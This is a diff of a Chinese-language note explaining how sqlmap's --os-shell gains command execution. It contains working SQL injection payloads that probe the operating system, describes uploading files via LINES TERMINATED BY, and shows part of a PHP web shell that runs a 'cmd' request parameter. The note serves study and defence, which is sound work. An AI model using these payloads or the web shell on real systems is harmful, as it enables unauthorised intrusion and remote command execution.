@@ -1,15 +1,15 @@
 # --os-shell
 
-执行步骤：  
-1、选择 web 应用语言   
-2、发现（提供）一个可写的绝对路径   
+执行步骤：\
+1、选择 web 应用语言 \
+2、发现（提供）一个可写的绝对路径 \
 3、顺序（不同方法）上传tmpujout.php、tmpbvwsp.php两个文件
 
 根据工具执行的攻击语句可看出，攻击过程中判断了操作系统类型并上传了文件：
 
 
 
-```text
+```
 1. id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT REPEAT(0x34,1024)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- MBKa&Submit=Submit
 
 2. id=1' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a767671,(SELECT (CASE WHEN (0x57=UPPER(MID(@@version_compile_os,1,1))) THEN 1 ELSE 0 END)),0x7170716271,0x78))s), 8446744073709551610, 8446744073709551610)))-- EJbF&Submit=Submit
@@ -21,11 +21,11 @@
 
 之后 sqlmap 按路径尝试去访问文件tmpujqbu.php，通过 POST 上传后门文件tmpbzhga.php
 
-![](../../.gitbook/assets/image%20%281%29.png)
+![](<../../.gitbook/assets/image (736).png>)
 
 可以看到tmpujqbu.php中的内容就是一个简单的文件上传，并将目标文件权限设置为 0755，注意这个文件生成利用的LINES TERMINATED BY，所以前面会带有之前 sql 执行的结果（这里就是admin admin）
 
-```text
+```
 ##tmpujqbu.php
 ##admin    admin
 <?php
@@ -48,7 +48,7 @@ if (isset($_REQUEST["upload"])) {
 
 而tmpbzhga.php可以看到就是一个标准的用于执行系统命令的后门脚本
 
-```text
+```
 // tmpbzhga.php
 <?php
 $c = $_REQUEST["cmd"];
@@ -124,4 +124,3 @@ print "<pre>" . $w . "</pre>"; ?>
 使用--os-shell需要的条件：FILE 权限、可写的结对路径、PHP GPC off
 
 –os-shell 退出后：会调用后门脚本删除上传文件后，进行自删除
-
